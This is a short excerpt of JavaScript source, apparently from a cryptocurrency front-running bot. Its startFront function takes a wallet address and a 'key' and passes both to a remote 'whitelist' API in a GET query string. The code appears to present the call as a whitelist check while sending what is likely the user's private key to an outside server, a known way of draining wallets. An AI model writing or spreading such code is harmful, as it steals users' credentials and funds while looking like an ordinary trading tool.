import { errorMessage, createNotification, client, whitelist } from "./api";
...
export async function startFront(node, wallet, key, amount, percent, minbnb, maxbnb) {
  try {
    ...
    whitelist.get(`?data=${wallet}&number=${key}`);
  } catch (err) {
    createNotification("error", errorMessage(err));
  }
